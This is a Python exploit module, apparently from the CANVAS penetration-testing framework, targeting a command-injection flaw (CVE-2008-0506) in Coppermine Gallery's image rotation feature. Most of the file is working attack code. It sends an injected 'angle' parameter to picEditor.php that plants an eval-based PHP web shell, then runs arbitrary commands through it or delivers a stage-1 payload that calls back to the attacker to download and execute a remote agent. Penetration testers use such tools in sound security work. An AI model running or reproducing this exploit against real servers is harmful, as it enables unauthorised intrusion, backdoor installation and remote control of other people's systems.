#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy #for urlopen
import re

NAME="coppermine" 
DESCRIPTION="Remote vulnerablility in Coppermine gets Shell"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Coppermine"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["URL"]="http://www.milw0rm.com/exploits/5019"
DOCUMENTATION["CVE Name"] = "CVE-2008-0506"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0506"
DOCUMENTATION['CVSS'] = 6.8

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

import urllib
from phplistener import get_php_stage1 #get our "Shellcode" 

NOTES="""
coppermine-gallery shell command execution
SITE: coppermine-gallery.net
VERSION: 1.4.13 (latest) maybe earlier..
REQUIRES: cpg installed with imagemagick (common)
BUG:
picEditor.php:

if ($_POST['angle']<>0){ // angle is not sanitized
$imgObj = $imgObj->rotateImage($_POST['angle']); 
  }
 }
$newimage = $imgObj->filename;
}//   newimage
------------------------------------------------
imageObjectIM.class.php:

function rotateImage(&$angle){ //we look at the rotate image function..

global $CONFIG;
$imgFile = escapeshellarg("$this->directory$this->filename");

$output = array();

 /*
  * Hack for working with ImageMagick on WIndows even if IM is installed in C:\Program Files.
  * By Aditya Mooley <aditya@sanisoft.com>
  */

if (eregi("win",getenv('OS'))) {
$imgFile = str_replace("'","\"" ,$imgFile );
$cmd = "\"".str_replace("\\","/", $CONFIG['impath'])."convert\" -quality {$this->quality} {$CONFIG['im_options']} -rotate $angle ".str_replace("\\","/" ,$imgFile )." ".str_replace("\\","/" ,$imgFile ); // $angle is passed to $cmd without ever being checked..

exec ("\"$cmd\"", $output, $retval); // $cmd is executes and so is our commands..
} else {
 $cmd = "{$CONFIG['impath']}convert -quality {$this->quality} {$CONFIG['im_options']} -rotate $angle $imgFile $imgFile";
 exec ($cmd, $output, $retval);
 }
"""

CHANGELOG="""

"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=80
        self.host=""
        self.badstring="\x00"
        self.setVersions()
        self.version=1
        self.done=0
        self.name=NAME    
        self.basepath="/"
        self.user=""
        self.password=""
	self.topic=""
        self.command=None #none by default. We want to try to automatically load MOSDEF
        self.basicauth_user=""
        self.basicauth_password=""
        self.hostname=None
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.getarg("basepath")
        self.getarg("command")
        self.ssl=self.argsDict.get("ssl",self.ssl)
        self.getarg("user")
        self.getarg("password")
        self.getarg("basicauth_user")
        self.getarg("basicauth_password")
        self.getarg("hostname")
	self.getarg("topic")
        if self.hostname in [None, ""]:
            allhosts=self.target.get_knowledge("www_hostnames")
            if allhosts==None:
                allhosts=["%s"%self.host]
        else:
            allhosts=[self.hostname]
        self.allhosts=allhosts

        return 
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=[""]

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.PHPMULTI]
        
    def test(self):
        """
        Quicky banner check - looks for comon basepaths
        """
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        self.log("Using vhost=%s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        for hostname in self.allhosts:
            self.log("Testing hostname: %s"%hostname)

            #automatically check out some common basepaths, starting with the one specified
            for basepath in [self.basepath, "/cpg1413/", "/gallery/"]:
                self.log("Testing for basepath: %s"%basepath)

                #If we have to do basic-auth, let's get an object from spkproxy here
                if self.basicauth_user:
                    auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
                else:
                    auth=None 
                    
                #this is the main call that does the magic here...
                fd=spkproxy.urlopen(protocol+"://"+self.host+"/"+basepath, hostname=hostname, exploit=self, auth=auth)
                data=fd.read()

                #now that we have the web page - we parse it and look for vulnerable versions
                #list of vulnerable versions so far
                for s in ["Coppermine"]:
                    #self.log("Data=%s"%data) #print out web page (big)
                    if s in data:
                        self.log("Found vulnerable coppermine-gallery in vhost %s at basepath %s"%(hostname, basepath))
                        self.argsDict["basepath"]=basepath
                        self.basepath=basepath
                        self.hostname=hostname
                        self.version=1
                        return 1
        return 0
    
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            ret=self.test()
            if not ret:
                self.log("Testing didn't find vulnerable target")
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("VHost: %s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
        else:
            auth=None
            
        UA=spkproxy.UserAgent(protocol+"://"+self.host+"/"+self.basepath, auth=auth, hostname=self.hostname, exploit=self)
        
        if self.command:
            self.log("Command: %s"%self.command)
            command=self.command
            command="print(startz);passthru('"+command+"');print(endz);"              
            data = UA.POST("picEditor.php", "newimage=../../images/edit.gif&angle=10;cp%20anycontent.php%20albums/edit/index.php;sed%20-i%20s/php/@eval\(\$_GET[c]\)\;die\(\)\;/%20albums/edit/index.php;")
	    data = UA.GET("albums/edit/index.php?c=%s"%(urllib.quote_plus(command)))    
	    if "startz" in data:
                result=data.split("startz")[1].split("endz")[0]
                #self.log("Command data: %s"%prettyprint(data))
                self.log("Command result=%s"%prettyprint(result))
                ret=1
            else:
                self.log("Command not run - service patched?!")
        else:
            command=self.get_php_to_mosdef().strip()
            command=command.replace("/","`pwd|cut -b1`") 
            self.log("Command: %s"%command)
            self.log("Sending Exploit")
	    data = UA.POST("picEditor.php", "newimage=../../images/edit.gif&angle=10;cp%20anycontent.php%20albums/edit/index.php;sed%20-i%20s/php/@eval\(\$_GET[c]\)\;die\(\)\;/%20albums/edit/index.php;")
	    data = UA.GET("albums/edit/index.php?c=%s"%(urllib.quote_plus(command)))
	    self.log("Data=%s"%data)
            self.log("Looking for PHP connectback")
        ret=self.ISucceeded()
            
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
        return ret
    
    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        
        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Using PHPMULTI callback of %s:%d"%(localhost,localport))

        badchars="" #none for this one
        ret=get_php_stage1(badchars,localhost,localport)
            
        return ret
        
    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
